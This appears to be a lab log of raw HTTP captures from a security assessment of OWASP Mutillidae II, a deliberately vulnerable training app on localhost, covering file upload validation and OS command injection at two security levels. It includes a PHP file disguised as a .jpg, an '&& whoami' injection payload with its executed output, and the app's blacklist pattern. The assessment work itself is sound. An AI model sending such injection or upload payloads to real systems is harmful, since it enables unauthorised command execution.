@@ -1,0 +1,149 @@
+================================================================
+OWASP MUTILLIDAE II — RAW REQUEST/RESPONSE CAPTURES
+Lab 02 — File Upload and Command Execution Security Assessment
+Target: http://127.0.0.1:42002/  (Version 2.12.7)
+================================================================
+
+
+----------------------------------------------------------------
+[1] BASELINE UPLOAD — Security Level 0 (Hosed)
+----------------------------------------------------------------
+POST /index.php?page=upload-file.php HTTP/1.1
+Host: 127.0.0.1:42002
+Content-Type: multipart/form-data; boundary=----geckoformboundary29588f4b892113d3cc92c4bdbbc25c95
+Content-Length: 634
+Cookie: security=low; showhints=1; username=admin; uid=1; PHPSESSID=6e224975919963...
+
+Form field name: UPLOAD_DIRECTORY
+[file field: marker2_valid.jpg]
+
+Response (rendered):
+File uploaded to /tmp/phpjk8h08a4o3r1eF0QwNx
+File moved to /tmp/marker2_valid.jpg
+Validation not performed
+Original File Name:    marker2_valid.jpg
+File Type:              image/jpeg
+File Size:              23 Bytes
+
+Observation: Application explicitly states "Validation not performed".
+MIME type is taken directly from the client-supplied Content-Type header.
+
+
+----------------------------------------------------------------
+[2] MISMATCH UPLOAD — Security Level 0
+----------------------------------------------------------------
+POST /index.php?page=upload-file.php HTTP/1.1
+Host: 127.0.0.1:42002
+Content-Type: multipart/form-data; boundary=----geckoformboundary2fcad3a9aea9aaaaf610c99e269ddcb2
+Content-Length: 659
+Cookie: security=low; showhints=1; username=admin; uid=1; PHPSESSID=6e224975919963...
+
+[file field: marker3_mismatch.jpg — content: '<?php echo "ICDFA-LAB02-MISMATCH-MARKER"; ?>']
+
+Response (rendered):
+File uploaded to /tmp/phplrdhvo1tn1ru5zNpfne
+File moved to /tmp/marker3_mismatch.jpg
+Validation not performed
+File Type:  image/jpeg
+File Size:  45 Bytes
+
+Observation: PHP-tag content accepted under a .jpg extension with no
+content/magic-byte validation.
+
+
+----------------------------------------------------------------
+[3] STORAGE / WEB-ACCESSIBILITY CHECK
+----------------------------------------------------------------
+Request A:
+GET /marker3_mismatch.jpg HTTP/1.1
+Host: 127.0.0.1:42002
+Response: HTTP/1.1 404 Not Found
+
+Request B:
+GET /tmp/marker3_mismatch.jpg HTTP/1.1
+Host: 127.0.0.1:42002
+Response: HTTP/1.1 404 Not Found
+
+Observation: Uploads are stored to /tmp/, outside the web-served directory
+tree. Not directly reachable via HTTP.
+
+
+----------------------------------------------------------------
+[4] COMMAND INJECTION BASELINE — Security Level 0
+----------------------------------------------------------------
+POST /index.php?page=dns-lookup.php HTTP/1.1
+Host: 127.0.0.1:42002
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+Cookie: security=low; showhints=1; username=admin; uid=1; PHPSESSID=6e224975919963...
+
+target_host=127.0.0.1&dns-lookup-php-submit-button=Lookup+DNS
+
+Response (rendered):
+1.0.0.127.in-addr.arpa   name = localhost.
+Authoritative answers can be found from:
+
+
+----------------------------------------------------------------
+[5] MINIMAL EXECUTION PROOF — Security Level 0
+----------------------------------------------------------------
+POST /index.php?page=dns-lookup.php HTTP/1.1
+Host: 127.0.0.1:42002
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Cookie: security=low; showhints=1; username=admin; uid=1; PHPSESSID=6e224975919963...
+
+target_host=127.0.0.1+%26%26+whoami&dns-lookup-php-submit-button=Lookup+DNS
+
+Response (rendered):
+1.0.0.127.in-addr.arpa   name = localhost.
+Authoritative answers can be found from:
+_mutillidae
+
+Observation: Injected 'whoami' command executed; output '_mutillidae'
+confirms the application runs as a distinct, dedicated low-privilege
+system account. The 'target_host' parameter is passed directly into a
+shell command with no sanitisation.
+
+
+----------------------------------------------------------------
+[6] SECURE MODE RETEST — Security Level 5 (Secure)
+----------------------------------------------------------------
+Command injection — browser submission of same payload:
+Result: Client-side JavaScript alert fired before submission —
+"Malicious characters are not allowed. [...] We use JavaScript defenses
+combined with filtering technology." No HTTP request was sent (confirmed
+via Burp — no corresponding entry in proxy history).
+
+Command injection — direct submission via intercepting proxy (JS bypassed):
+POST /index.php?page=dns-lookup.php HTTP/1.1
+Host: 127.0.0.1:42002
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Cookie: PHPSESSID=5cc1641383c131214c1462c693591626; showhints=0; username=admin; uid=1
+
+target_host=127.0.0.1+%26%26+whoami&dns-lookup-php-submit-button=Lookup+DNS
+
+Response: HTTP/1.1 200 OK
+  "Error: Invalid Input" row unhidden; no DNS output, no command output.
+  Security Level: 5 (Secure) confirmed in page header.
+  Client-side filter pattern disclosed in page source:
+    OS command injection pattern: /[;&|<>]/
+    Cross-site scripting pattern:  /[<>=()]/
+
+Observation: Level 5 enforces a genuine SERVER-SIDE character blacklist in
+addition to the client-side JavaScript check — the payload was rejected
+even when the browser's JS validation was bypassed entirely.
+
+Upload retest (marker3_mismatch.jpg) at Level 5:
+Response (rendered):
+File uploaded to /tmp/php9bhi5f3ejt7j9E2tfal
+File moved to /tmp/marker3_mismatch.jpg
+Validation performed.
+File Type:  image/jpeg
+File Size:  45 Bytes
+
+Observation: Message changes to "Validation performed", but the same
+content/extension mismatch that was accepted at Level 0 is still accepted
+— indicating the check covers extension/MIME type but not actual file
+content or magic bytes.
